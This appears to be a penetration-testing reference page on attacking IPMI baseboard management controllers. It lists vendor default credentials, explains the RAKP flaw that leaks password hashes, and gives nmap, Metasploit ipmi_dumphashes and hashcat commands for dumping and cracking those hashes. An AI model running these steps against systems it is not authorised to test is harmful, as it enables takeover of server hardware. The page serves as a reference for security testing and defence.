# IPMI

Use this page to enumerate IPMI, identify weak defaults, and capture hashes for offline cracking.

### Key notes

* **What IPMI is:** A hardware-based host management protocol that works independently of the host OS, CPU, or BIOS state.
* **Key port:** UDP `623` (`asf-rmcp`)
* **Main component:** The Baseboard Management Controller (`BMC`)
* **Main risk:** IPMI 2.0 can leak crackable password hashes during RAKP authentication

### Core architecture and ports

IPMI is built around the Baseboard Management Controller, which is usually an embedded ARM-based chip running a minimal management environment directly on the motherboard.

Key components:

* `BMC` — the main microcontroller that processes management commands.
* `ICMB` or `IPMB` — internal bus interfaces for chassis and component communication.
* IPMI memory — stores event logs and repository data.

### Known vendor default credentials

| **Hardware vendor platform**   | **Default username** | **Default password profile**                                             |
| ------------------------------ | -------------------- | ------------------------------------------------------------------------ |
| Dell iDRAC                     | `root`               | `calvin`                                                                 |
| Supermicro IPMI                | `ADMIN`              | `ADMIN`                                                                  |
| HP iLO (Integrated Lights-Out) | `Administrator`      | Factory-randomized 8-character string with uppercase letters and numbers |

### The RAKP protocol flaw (IPMI 2.0)

* **Core issue:** During the Remote Authenticated Key Exchange Protocol (`RAKP`) handshake, the server sends a salted MD5 or SHA1 password hash before client authentication finishes.
* **Impact:** Any unauthenticated user can query port `623` for a valid account such as `admin`, `ADMIN`, or `root`, then harvest a hash for offline cracking.
* **Catch:** This is built into the protocol design. Mitigation depends on tight network segmentation and strong passwords.

### Service footprinting and exploitation

#### Version profiling with `nmap`

{% code title="Check IPMI version" %}
```bash
sudo nmap -sU --script ipmi-version -p 623 <TARGET_IP>
```
{% endcode %}

#### Discovery with Metasploit

{% code title="Metasploit IPMI version scan" %}
```
msf6 > use auxiliary/scanner/ipmi/ipmi_version
msf6 > set rhosts <TARGET_IP>
msf6 > run
```
{% endcode %}

#### Dump hashes with Metasploit

{% code title="Metasploit IPMI hash dump" %}
```
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
msf6 > set rhosts <TARGET_IP>
msf6 > run
```
{% endcode %}

### Offline password cracking (`hashcat`)

When parsing a Metasploit IPMI hash dump, strip username prefixes or target headers so the file contains only the raw hash material, such as `ipmi.hash`.

{% code title="Crack IPMI hashes with Hashcat" %}
```bash
# Standard wordlist attack (Hashcat mode 7300)
hashcat -m 7300 ipmi.hash /usr/share/wordlists/rockyou.txt

# HP iLO factory-default mask attack (?1 = uppercase + digits)
hashcat -m 7300 ipmi.hash -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u

# Review previously cracked results
hashcat -m 7300 ipmi.hash --show
```
{% endcode %}
